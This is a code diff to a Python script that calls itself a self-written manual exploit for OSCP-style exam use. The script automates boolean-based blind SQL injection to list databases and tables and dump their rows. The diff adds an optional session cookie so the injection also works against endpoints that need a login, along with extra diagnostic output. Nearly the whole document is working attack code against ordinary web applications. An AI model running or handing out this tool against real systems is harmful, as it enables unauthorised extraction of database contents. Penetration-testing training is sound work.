@@ -6,6 +6,7 @@
 # Flow: list DBs -> pick all/one -> list tables -> pick all/one -> dump rows.
 # Uses the proven group_concat pattern (one query per table, no LIMIT loop).
 # Supports GET (param in query string) and POST (param in body).
+# Optional session cookie for endpoints that require an authenticated session.
 # Self-written manual exploit (OSCP-appropriate). Confirm exam rules before use.
 # ---------------------------------------------------------------------------
 import requests
@@ -30,20 +31,31 @@ TEMPLATE     = input("Payload template (use [INJECT] as placeholder): ").strip()
 # Its ABSENCE from the response = condition TRUE.
 FALSE_MARKER = input("String shown only on FALSE/failed response   : ").strip()
 
+# --- Optional session cookie ----------------------------------------------
+# Name prompt has a default; pressing Enter uses it. Value prompt takes the
+# raw cookie value only (no "name=" prefix). Blank value -> run without a cookie.
+COOKIE_NAME  = input("Cookie name (Enter for default 'token')      : ").strip() or "token"
+COOKIE_VALUE = input("Session cookie value (blank = no cookie)     : ").strip()
+
+# One session reused for every request; the cookie (if set) rides along
+# automatically in the Cookie header on each request.
+SESSION = requests.Session()
+if COOKIE_VALUE:
+    SESSION.cookies.set(COOKIE_NAME, COOKIE_VALUE)
+
 # --- Request sender (GET -> query string, POST -> body) --------------------
 def send(payload):
     """Send one payload with the configured method and return the response.
-    GET puts the injectable field (and optional second field) in the query
-    string; POST puts them in the form body."""
+    Runs over SESSION so the cookie is attached when one was provided."""
     if METHOD == "GET":
         params = {INJ_FIELD: payload}
         if OTHER_FIELD:
             params[OTHER_FIELD] = OTHER_VALUE
-        return requests.get(URL, params=params)
+        return SESSION.get(URL, params=params)
     data = {INJ_FIELD: payload}
     if OTHER_FIELD:
         data[OTHER_FIELD] = OTHER_VALUE
-    return requests.post(URL, data=data)
+    return SESSION.post(URL, data=data)
 
 # --- Startup oracle sanity check (fails loudly instead of dumping garbage) --
 print("\n[*] Sanity check...")
@@ -52,9 +64,11 @@ def _probe(cond):
     return FALSE_MARKER not in r.text
 if not (_probe("1=1") and not _probe("1=2")):
     print("[!] Oracle FAILED: 1=1 should be TRUE and 1=2 FALSE.")
+    print("    If the endpoint needs auth, check the cookie name/value are right.")
     print(f"    method   = {METHOD}")
     print(f"    template = {TEMPLATE!r}")
     print(f"    marker   = {FALSE_MARKER!r}")
+    print(f"    cookie   = {COOKIE_NAME}={'(set)' if COOKIE_VALUE else '(none)'}")
     sys.exit(1)
 print("[+] Oracle works (1=1 TRUE, 1=2 FALSE).\n")
 
@@ -63,9 +77,7 @@ SKIP_DBS = ["information_schema", "performance_schema", "mysql", "sys"]
 
 # --- Core oracle -----------------------------------------------------------
 def oracle(condition):
-    """Send one boolean condition, return True if the app signals TRUE.
-    Stateless (no session) so a 'success' response never leaves a cookie
-    that would make later requests all look logged-in."""
+    """Send one boolean condition, return True if the app signals TRUE."""
     r = send(TEMPLATE.replace("[INJECT]", condition))
     return FALSE_MARKER not in r.text
 
